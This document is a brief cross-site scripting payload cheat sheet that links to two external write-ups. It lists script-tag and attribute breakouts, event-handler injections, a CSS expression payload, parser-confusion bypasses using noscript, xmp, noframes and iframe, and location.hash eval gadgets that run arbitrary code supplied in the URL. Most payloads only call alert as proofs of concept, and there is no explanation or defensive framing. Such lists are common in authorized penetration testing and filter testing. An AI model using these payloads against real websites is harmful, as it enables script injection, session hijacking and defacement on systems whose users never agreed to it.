# xss sets
[About Google](https://nosec.org/home/detail/2449.html)
[Xss Sets](https://www.hahwul.com/2019/04/bypass-xss-protection-with-xmp-noscript-etc....html)
```JavaScript
<script>alert(1)</script>
"><script>alert(1)</script>
"><script>alert(document.domain)</script>
'"><script>alert(1)</script>
'"><script>alert(1)</script>"
';"<script>alert(1)</script>
</script><script>alert(1)</script>
<img src='' onerror=alert(/poc/)>
<DIV STYLE="width: ｅxpression(alert('XSS'));">
"><BODY ONLOAD=alert(188)>,1/
</title><script>alert(/poc/)</script>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<noscript><p title="</noscript><svg/onload=alert(1)>">
<xmp><p title="</xmp><svg/onload=alert(1)>">
<noframes><p title="</noframes><svg/onload=alert(1)>">
<iframe><p title="</iframe><svg/onload=alert(1)>">
<iframe style="visibility:hidden"><p title="</iframe><svg/onload=alert(1)>">
<svg onload=alert(document.domain)>

location:
<body/onload=eval(location.hash.slice(1))>#alert(1)
<body/onload=setTimeout(location.hash.substr(1))>#alert(1)

```
